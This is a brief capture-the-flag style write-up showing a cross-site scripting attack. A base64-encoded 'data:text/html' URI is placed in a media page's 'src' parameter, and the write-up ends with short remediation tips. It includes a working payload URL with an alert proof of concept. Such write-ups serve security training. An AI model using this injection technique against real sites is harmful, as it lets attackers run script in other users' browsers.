On the page http://IP/  we can see that clickable image
redirect us to:
http://IP/?page=media&src=nsa


we can change nsa to base64 script

example: 
<script>alert('test')</script> -> converted to base64 -> PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+

and add the 64base sufix to it in the clickable
http://IP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+


This works because the request response accept text/html

solution:

- avoid javascript URL's
- dont't allow text/html in request response
